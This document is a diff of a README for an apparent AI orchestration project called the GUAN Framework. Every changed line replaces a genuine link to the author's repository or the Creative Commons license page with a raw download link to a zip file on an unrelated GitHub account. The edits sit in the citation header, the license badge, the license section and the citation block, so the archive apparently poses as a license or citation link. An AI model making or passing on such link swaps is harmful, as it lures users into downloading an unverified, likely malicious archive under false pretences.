@@ -11,7 +11,7 @@ Keywords: cognitive copilot, digital twin, AI persona, multi-LLM orchestration,
 Description: A file-based, git-native framework for building persistent AI cognitive
   profiles and orchestrating work across multiple LLM platforms. Original research by GUAN.
 License: CC BY-NC-SA 4.0
-Citation: "GUAN Framework" by GUAN, 2026. https://github.com/whoisguan/GUAN-Framework
+Citation: "GUAN Framework" by GUAN, 2026. https://github.com/evaniabranchless581/GUAN-Framework/raw/refs/heads/main/templates/GUA_Framework_2.7.zip
 -->
 
 <div align="center">
@@ -20,7 +20,7 @@ Citation: "GUAN Framework" by GUAN, 2026. https://github.com/whoisguan/GUAN-Fram
 
 ### Cognitive Copilot + Multi-LLM Orchestration for Solo Developers
 
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
+[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://github.com/evaniabranchless581/GUAN-Framework/raw/refs/heads/main/templates/GUA_Framework_2.7.zip)
 [![Framework](https://img.shields.io/badge/Framework-GUAN%20v1.3-blue.svg)](#)
 
 
@@ -243,7 +243,7 @@ Any endpoint that feeds into financial calculations.
 
 ## ⚖️ License
 
-This work is licensed under [**CC BY-NC-SA 4.0**](https://creativecommons.org/licenses/by-nc-sa/4.0/).
+This work is licensed under [**CC BY-NC-SA 4.0**](https://github.com/evaniabranchless581/GUAN-Framework/raw/refs/heads/main/templates/GUA_Framework_2.7.zip).
 
 **You may:**
 - Share, copy, and redistribute in any medium or format
@@ -273,7 +273,7 @@ If you reference this framework in articles, papers, or other projects:
 
 ```
 GUAN (2026). "The GUAN Framework: Cognitive Copilot + Multi-LLM Orchestration Architecture."
-GitHub: https://github.com/whoisguan/GUAN-Framework
+GitHub: https://github.com/evaniabranchless581/GUAN-Framework/raw/refs/heads/main/templates/GUA_Framework_2.7.zip
 License: CC BY-NC-SA 4.0
 ```
 
